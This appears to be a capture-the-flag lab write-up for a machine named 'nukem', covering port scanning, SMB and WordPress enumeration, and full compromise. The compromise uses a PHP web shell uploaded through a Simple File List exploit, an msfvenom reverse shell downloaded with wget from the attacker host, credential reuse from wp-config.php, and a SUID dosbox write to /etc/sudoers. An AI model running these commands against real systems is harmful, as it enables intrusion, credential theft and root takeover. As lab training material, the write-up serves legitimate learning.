## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.153.105
# HOSTNAME
nukem					// Found after initial foothold
# OPERATING SYSTEM
Arch Linux				// Found after initial foothold
# CREDENTIALS
commander:CommanderKeenVorticons1990	// Found after initial foothold
```
## OPEN PORTS DETAILS
```bash
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 8.3 (protocol 2.0)
- OpenSSH 8.3 
80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
- Web Server
	- Apache httpd 2.4.46
- CMS
	- WordPress 5.5.1
- Web Language
	- PHP/7.4.10

3306/tcp  open  mysql?      syn-ack ttl 61
5000/tcp  open  http        syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.8.5)
- Web Server
	- Werkzeug httpd 1.0.1
- Web Language
	- Python 3.8.5

13000/tcp open  http        syn-ack ttl 61 nginx 1.18.0
- Web Server
	- nginx 1.18.0

36445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
```
# ENUMERATION 
## PORT 36445
```bash
# Listing shares
sudo smbclient -L $ip -p 36445 
Anonymous login successful
Sharename       Type      Comment
---------       ----      -------
Commander       Disk      Commander Files
IPC$            IPC       IPC Service (Samba 4.12.6)

# Listing share permissions
sudo netexec smb $ip --shares -u '' -p '' --port 36445
SMB         192.168.153.105 36445  NUKEM            Share           Permissions     Remark
SMB         192.168.153.105 36445  NUKEM            -----           -----------     ------
SMB         192.168.153.105 36445  NUKEM            Commander       READ,WRITE      Commander Files
SMB         192.168.153.105 36445  NUKEM            IPC$                            IPC Service (Samba 4.12.6)

# Enumerating share //$ip/Commander
sudo smbclient  //$ip/Commander -p 36445
smb: \> dir
  .                                   D        0  Sat Nov 16 11:33:57 2024
  ..                                  D        0  Sat Aug  3 03:26:45 2024
  .gitignore                          H       15  Fri Sep 18 22:49:19 2020
  README.md                           N      417  Fri Sep 18 22:49:19 2020
  server.py                           N     2552  Fri Sep 18 22:49:19 2020
  requirements.txt                    N      287  Fri Sep 18 22:49:19 2020
  chinook.db                          N   884736  Fri Sep 18 22:49:19 2020
```
## PORT 80
```bash
# Add to /etc/hosts
192.168.153.105 nukem.pg

# Worpress enumeration 
sudo wpscan --url http://nukem.pg
- WordPress theme in use: news-vibrant Version: 1.0.12 
- WordPress Plugin simple-file-list Version: 4.2.2 
- WordPress Plugin tutor Version: 1.5.3 

# Searching Exploits for Wordpress themes and plugins
- WordPress theme in use: news-vibrant Version: 1.0.12 
	- None
- WordPress Plugin simple-file-list Version: 4.2.2 
	- WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload | php/webapps/48979.py
	- WordPress Plugin Simple File List 4.2.2 - Remote Code Execution | php/webapps/48449.py
- WordPress Plugin tutor Version: 1.5.3 
	- WordPress Plugin Tutor LMS 1.5.3 - Cross-Site Request Forgery (Add User) | php/webapps/48151.txt
	- WordPress Plugin Tutor.1.5.3 - Local File Inclusion | php/webapps/48058.txt
	- WordPress Plugin tutor.1.5.3 - Persistent Cross-Site Scripting | php/webapps/48059.txt

```
## INITIAL FOOTHOLD
```bash
# Trying - WordPress Plugin Simple File List 4.2.2 - Remote Code Execution | php/webapps/48449.py
searchsploit -m php/webapps/48449.py
- Editing payload on 484493py
payload = "<?php system($_GET['cmd']);?>"

- Executing
sudo python3 48449.py http://nukem.pg
[ ] File 8942.png generated with password: 9cc1aab011396c2fe1634b328c31a0e4
[ ] File uploaded at http://nukem.pg/wp-content/uploads/simple-file-list/8942.png
[ ] File moved to http://nukem.pg/wp-content/uploads/simple-file-list/8942.php
[+] Exploit seem to work.
[*] Confirmning ...

- Accessing URL http://nukem.pg/wp-content/uploads/simple-file-list/8942.php
curl http://nukem.pg/wp-content/uploads/simple-file-list/8942.php?cmd=id
uid=33(http) gid=33(http) groups=33(http)

# Proper shell
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.203 LPORT=80 -f elf -o shell.elf
sudo python3 -m http.server 80
curl http://nukem.pg/wp-content/uploads/simple-file-list/8942.php?cmd=wget%20192.168.45.203%2Fshell.elf%20-O%20%2Ftmp%2Fshell.elf
curl http://nukem.pg/wp-content/uploads/simple-file-list/8942.php?cmd=chmod%20%2Bx%20%2Ftmp%2Fshell.elf
curl http://nukem.pg/wp-content/uploads/simple-file-list/8942.php?cmd=%2Ftmp%2Fshell.elf

sudo python3 -m http.server 80
192.168.153.105 - - [16/Nov/2024 12:00:44] "GET /shell.elf HTTP/1.1" 200 -
^C
sudo nc -nvlp 80
connect to [192.168.45.203] from (UNKNOWN) [192.168.153.105] 53030
```
## USER SHELL
```bash
# Found Database Credentials
cat /srv/http/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );

# Credentials
commander:CommanderKeenVorticons1990

# Trying the credentials on ssh
sudo ssh commander@$ip
[commander@nukem ~]$ id
uid=1000(commander) gid=1000(commander) groups=1000(commander)
[commander@nukem ~]$ whoami
commander

# Information Gathering
cat /etc/*-release
Arch Linux release
LSB_VERSION=1.4
DISTRIB_ID=Arch
DISTRIB_RELEASE=rolling
DISTRIB_DESCRIPTION="Arch Linux"
NAME="Arch Linux"
PRETTY_NAME="Arch Linux"
ID=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://www.archlinux.org/"
DOCUMENTATION_URL="https://wiki.archlinux.org/"
SUPPORT_URL="https://bbs.archlinux.org/"
BUG_REPORT_URL="https://bugs.archlinux.org/"
LOGO=archlinux

```
## PRIVILEGE ESCALATION
```bash
# SUID
find / -perm -u=s -type f 2>/dev/null
ls -la /usr/bin/dosbox
-rwsr-xr-x 1 root root 2606856 Jul  7  2020 /usr/bin/dosbox

# Reference GTFOBINS
LFILE='/etc/sudoers'
./dosbox -c 'mount c /' -c "echo  >c:$LFILE" -c exit

# Privesc
[commander@nukem ~]$ LFILE='/etc/sudoers'
[commander@nukem ~]$ /usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >>c:$LFILE" -c exit
DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG:Loading primary settings from config file /home/commander/.dosbox/dosbox-0.74-3.conf
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
SHELL:Redirect output to c:/etc/sudoers
[commander@nukem ~]$ sudo -l
[sudo] password for commander: 
Runas and Command-specific defaults for commander:
    Defaults!/etc/ctdb/statd-callout !requiretty

User commander may run the following commands on nukem:
    (ALL) ALL
[commander@nukem ~]$ sudo su
[root@nukem commander]# id
uid=0(root) gid=0(root) groups=0(root)
[root@nukem commander]# 

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# sudo nmap -p- -sC -sV -vv -oN nmap/scan-script-version $ip

PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIa7leEeVssjdrJAMl1xs+qCC7DvEgvhDmYxn7oFKkzQdWQXNwPDaf19b+8uxImEAQ3uRXYg56MItfQ54pTuDpJSuuSfCXyqH9/o5S+gugCgkGiWRTlyXAmCe4uM4ZZD09yChsJ0LdPKvqM19l5o+8KCBuXAGOX7Co60oUpD3+xINAS/XQYFdY1RARpIsuzd3qUHkeKJvGp2hbI6b2bgfcjTcPgBaLKLMa6OZ208whcHdYwJdOnc2m3mi2o9v+ETK+P8exJ1/DTIYLLVlo0BPMqlCE2R4JyEfp8RQeggq42yHOMmBI6pQ/BhClgheiPDhF+hQLNafLgkLeHv625eFq7V8bwi2Uy7/NV8jip1FobFhaT2L/MiRHnx7my4Cxk0BzoAvj0fOzOXouT5rMon6o14x/HTQBqORFhLvTNkCnPE0nen8ohQ05R0oWFiVwH74OaLHvwmzUuy8d1Wln5rW26q+UjZy1AIGpRHvyfEV5dzmB0ujnrE8Io702tIb/ssM=
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLFrQmyRArhVBZ7HJi6W3YN/7sFuTBg5RLoffgVyCRaVpqj/VAwL3c85iE7s1x61oRu7CiVIvzOcYAMh5BfOjuI=
|   256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWYiSpSV5PFfFK8fw7UZ1MAMHej2xBONdUi5CSr7huF

80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10

3306/tcp  open  mysql?      syn-ack ttl 61
| mysql-info: 
|_  MySQL Error: Host '192.168.45.203' is not allowed to connect to this MariaDB server
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.45.203' is not allowed to connect to this MariaDB server

5000/tcp  open  http        syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5

13000/tcp open  http        syn-ack ttl 61 nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
| http-methods: 
|_  Supported Methods: GET HEAD

36445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
```

